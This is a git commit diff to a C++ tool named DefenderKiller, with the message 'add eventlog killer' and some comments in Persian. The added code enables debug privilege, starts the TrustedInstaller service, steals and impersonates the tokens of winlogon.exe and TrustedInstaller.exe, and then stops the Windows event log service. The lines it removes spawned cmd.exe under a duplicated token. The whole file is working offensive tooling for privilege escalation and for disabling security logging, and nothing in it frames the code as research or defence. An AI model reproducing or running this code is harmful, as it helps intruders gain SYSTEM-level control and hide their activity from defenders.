bbeba59ae14425c7cb0324b41060ff2a17a3fe93
yasinabedini <yasinabedini.net@gmail.com>
2025-09-20 01:22:23 +0330

    faet - add eventlog killer

--- DefenderKiller/DefenderKiller.cpp
+++ DefenderKiller/DefenderKiller.cpp
@@ -1,17 +1,13 @@
-#include <iostream>
+﻿#define _WIN32_WINNT 0x0500
 #include <Windows.h>
+#include <iostream>
 #include <tlhelp32.h>
-
-
+#include <Lmcons.h> 
+#include <vector>
+#pragma comment(lib, "Secur32.lib")
 
 BOOL StartTrustedInstallerService() {
-	//Get a Handler to the SCM database
-
-	SC_HANDLE schSCManager = OpenSCManager(
-		NULL,     //Local Computer
-		NULL,
-		SC_MANAGER_ALL_ACCESS
-	);
+	SC_HANDLE schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
 
 	if (NULL == schSCManager)
 	{
@@ -20,17 +16,12 @@ BOOL StartTrustedInstallerService() {
 	}
 	printf("[+] OpenSCManager success!\n");
 
-	// Get a handler to the service
-
-	SC_HANDLE schService = OpenService(
-		schSCManager,     //SCM database
-		L"TrustedInstaller",  // Name of Service
-		SERVICE_START
-	);
+	SC_HANDLE schService = OpenService(schSCManager, L"TrustedInstaller", SERVICE_START);
 
 	if (schService == NULL)
 	{
-		printf("[-] OpenService failed (%d)\n", GetLastError()); CloseServiceHandle(schSCManager);
+		printf("[-] OpenService failed (%d)\n", GetLastError());
+		CloseServiceHandle(schSCManager);
 		return FALSE;
 	}
 
@@ -53,46 +44,130 @@ BOOL StartTrustedInstallerService() {
 	Sleep(2000);
 	CloseServiceHandle(schService);
 	CloseServiceHandle(schSCManager);
-
 	return TRUE;
 }
 
-int GetProcessByName(PCWSTR name)
+DWORD GetProcessByName(PCWSTR name)
 {
 	DWORD pid = 0;
-
 	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-	PROCESSENTRY32 process;
+	PROCESSENTRY32W process;  // استفاده از PROCESSENTRY32W برای Unicode
 	ZeroMemory(&process, sizeof(process));
 	process.dwSize = sizeof(process);
 
-	//walkthrough all Processes
-	if (Process32First(snapshot, &process))
+	if (Process32FirstW(snapshot, &process))  // استفاده از Process32FirstW
 	{
 		do
 		{
 			if (wcscmp(process.szExeFile, name) == 0)
 			{
-				return process.th32ProcessID;
+				pid = process.th32ProcessID;
+				break;
 			}
-		} while (Process32Next(snapshot, &process));
+		} while (Process32NextW(snapshot, &process));  // استفاده از Process32NextW
 	}
 
 	CloseHandle(snapshot);
+	return pid;
+}
 
-	return NULL;
+void PrintDomainUserFromToken(HANDLE token)
+{
+	DWORD size = 0;
+	GetTokenInformation(token, TokenUser, NULL, 0, &size);
+
+	std::vector<BYTE> buffer(size);
+	if (GetTokenInformation(token, TokenUser, buffer.data(), size, &size))
+	{
+		TOKEN_USER* user = reinterpret_cast<TOKEN_USER*>(buffer.data());
+		WCHAR name[256], domain[256];
+		DWORD nameLen = 256, domainLen = 256;
+		SID_NAME_USE use;
+
+		if (LookupAccountSidW(NULL, user->User.Sid, name, &nameLen, domain, &domainLen, &use))
+		{
+			wprintf(L"[+] Token user: %ls\\%ls\n", domain, name);
+		}
+	}
+}
+
+BOOL EnableDebugPrivilege()
+{
+	HANDLE hToken;
+	TOKEN_PRIVILEGES tp;
+	LUID luid;
+
+	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
+		return FALSE;
+	}
+
+	if (!LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &luid)) {
+		CloseHandle(hToken);
+		return FALSE;
+	}
+
+	tp.PrivilegeCount = 1;
+	tp.Privileges[0].Luid = luid;
+	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
+		CloseHandle(hToken);
+		return FALSE;
+	}
+
+	CloseHandle(hToken);
+	return TRUE;
+}
+
+BOOL StopDefenderService()
+{
+	SERVICE_STATUS_PROCESS ssp;
+	SC_HANDLE schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+
+	if (schSCManager == NULL)
+	{
+		printf("[-] OpenSCManager failed (%d)\n", GetLastError());
+		return FALSE;
+	}
+	printf("[+] OpenSCManager success!\n");
+	SC_HANDLE schService = OpenService(schSCManager, L"eventlog", SERVICE_STOP | SERVICE_QUERY_STATUS);
+	if (schService == NULL)
+	{
+		printf("[-] OpenService failed (%d)\n", GetLastError());
+		CloseServiceHandle(schSCManager);
+		return FALSE;
+	}
+	printf("[+] OpenService success!\n");
+
+	if (!ControlService(schService, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS)&ssp))
+	{
+		printf("[-] ControlService failed (%d)\n", GetLastError());
+		CloseServiceHandle(schService);
+		CloseServiceHandle(schSCManager);
+		return FALSE;
+	}
 }
 
 int main(int argc, char** argv)
 {
-	//int f = mm(4, 5);
-	HANDLE tokenHandle = NULL;
+	HANDLE winlogonTokenHandle = NULL;  // توکن Winlogon
+	HANDLE tiTokenHandle = NULL;        // توکن TrustedInstaller
 	HANDLE duplicateTokenHandle = NULL;
 	STARTUPINFO startupInfo;
 	PROCESS_INFORMATION processInformation;
+	WCHAR username[UNLEN + 1];
+	DWORD username_len = UNLEN + 1;
+
 	ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
 	ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
 	startupInfo.cb = sizeof(STARTUPINFO);
+
+	if (EnableDebugPrivilege()) {
+		printf("[+] Debug privilege enabled\n");
+	}
+	else {
+		printf("[-] Failed to enable debug privilege (%d)\n", GetLastError());
+	}
 
 	if (StartTrustedInstallerService())
 	{
@@ -103,57 +178,119 @@ int main(int argc, char** argv)
 		exit(1);
 	}
 
-	printf("[+] Current user is : ");
-
-	DWORD  PID_TO_IMPERSONATE = GetProcessByName(L"winlogon.exe");
-	if (PID_TO_IMPERSONATE == NULL)
+	DWORD PID_TO_IMPERSONATE = GetProcessByName(L"winlogon.exe");
+	if (PID_TO_IMPERSONATE == 0)
 	{
 		printf("[-] Winlogon process not found\n");
 		exit(1);
 	}
 	else
 	{
-		printf("[+] Winlogon process found!\n");
+		printf("[+] Winlogon process found! PID: %d\n", PID_TO_IMPERSONATE);
 	}
 
-	DWORD  TI_PROCESS = GetProcessByName(L"TrustedInstaller.exe");
-	if (PID_TO_IMPERSONATE == NULL)
+	DWORD TI_PROCESS = GetProcessByName(L"TrustedInstaller.exe");
+	if (TI_PROCESS == 0)
 	{
 		printf("[-] TrustedInstaller process not found\n");
 		exit(1);
 	}
 	else
 	{
-		printf("[+] TrustedInstaller process found!\n");
+		printf("[+] TrustedInstaller process found! PID: %d\n", TI_PROCESS);
+	}
+
+	// مرحله 1: گرفتن توکن Winlogon
+	HANDLE winlogonProcessHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, PID_TO_IMPERSONATE);
+	if (winlogonProcessHandle == NULL) {
+		printf("[-] WINLOGON OpenProcess() failed: %d\n", GetLastError());
+		exit(1);
+	}
+	printf("[+] WINLOGON OpenProcess() success!\n");
+
+	BOOL getWinlogonToken = OpenProcessToken(winlogonProcessHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &winlogonTokenHandle);
+	if (!getWinlogonToken) {
+		printf("[-] WINLOGON OpenProcessToken() failed: %d\n", GetLastError());
+		CloseHandle(winlogonProcessHandle);
+		exit(1);
+	}
+	printf("[+] WINLOGON OpenProcessToken() success!\n");
+
+	BOOL impersonateUser = ImpersonateLoggedOnUser(winlogonTokenHandle);
+	if (impersonateUser) {
+		printf("[+] WINLOGON ImpersonateLoggedOnUser() success!\n");
+		PrintDomainUserFromToken(winlogonTokenHandle);
+
+		username_len = UNLEN + 1;
+		if (GetUserNameW(username, &username_len)) {
+			wprintf(L"[+] Current user is: %ls\n", username);
+		}
+	}
+	else {
+		printf("[-] WINLOGON ImpersonateLoggedOnUser() failed: %d\n", GetLastError());
+	}
+
+	CloseHandle(winlogonProcessHandle);
+
+	// مرحله 2: گرفتن توکن TrustedInstaller
+	HANDLE tiProcessHandle = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, TI_PROCESS);
+	if (tiProcessHandle == NULL) {
+		printf("[-] TrustedInstaller OpenProcess() failed: %d\n", GetLastError());
+
+		// امتحان با دسترسی محدود
+		tiProcessHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, TI_PROCESS);
+		if (tiProcessHandle == NULL) {
+			printf("[-] TrustedInstaller OpenProcess() (limited) failed: %d\n", GetLastError());
+
+			// cleanup
+			if (tiProcessHandle) CloseHandle(tiProcessHandle);
+			exit(1);
+		}
+		else {
+			printf("[+] TrustedInstaller OpenProcess() (limited) success!\n");
+		}
+	}
+	else {
+		printf("[+] TrustedInstaller OpenProcess() success!\n");
 	}
 
 
-	HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE);
-	if (GetLastError() == NULL) printf("[+] WINLOGON OpenProcess() success!\n");
+	BOOL getTiToken = OpenProcessToken(tiProcessHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &tiTokenHandle);
+	if (!getTiToken) {
+		printf("[-] TrustedInstaller OpenProcessToken() failed: %d\n", GetLastError());
+		CloseHandle(tiProcessHandle);
+		exit(1);
+	}
+	printf("[+] TrustedInstaller OpenProcessToken() success!\n");
+
+	BOOL impersonateTiUser = ImpersonateLoggedOnUser(tiTokenHandle);
+	if (impersonateTiUser) {
+		printf("[+] TrustedInstaller ImpersonateLoggedOnUser() success!\n");
+		PrintDomainUserFromToken(tiTokenHandle);
+
+		username_len = UNLEN + 1;
+		if (GetUserNameW(username, &username_len)) {
+			wprintf(L"[+] Current user is: %ls\n", username);
+		}
+	}
+	else {
+		printf("[-] TrustedInstaller ImpersonateLoggedOnUser() failed: %d\n", GetLastError());
+	}
+
+	CloseHandle(tiTokenHandle);
+
+
+
+
+	if (StopDefenderService())
+	{
+		printf("[+] TRUSTEDINSTALLER StopDefenderService() success!\n");
+	}
 	else
 	{
-		printf("[-] WINLOGON OpenProcess() Return Code: %i\n", processHandle);
-		printf("[-] WINLOGON OpenProcess() Error: %i\n", GetLastError());
+		printf("[+] TRUSTEDINSTALLER StopDefenderService() Error : %i!\n", GetLastError());
 	}
 
-	BOOL getToken = OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &tokenHandle);
-	if (GetLastError() == NULL) printf("[+] WINLOGON OpenProcessToken() success!\n");
-	else
-	{
-		printf("[-] WINLOGON OpenProcessToken() Return Code: %i\n", getToken);
-		printf("[-] WINLOGON OpenProcessToken() Error: %i\n", GetLastError());
-	}
-
-	BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
-
-	if (GetLastError() == NULL)
-	{
-		printf("[+] WINLOGON ImpersonatedLoggedOnUser() success!\n");
-		printf("[+] WINLOGON Current user is: ss");
-	}
-
-	BOOL duplicateToken = DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
-	BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
-
+	getchar();
+	return 0;
 }
-
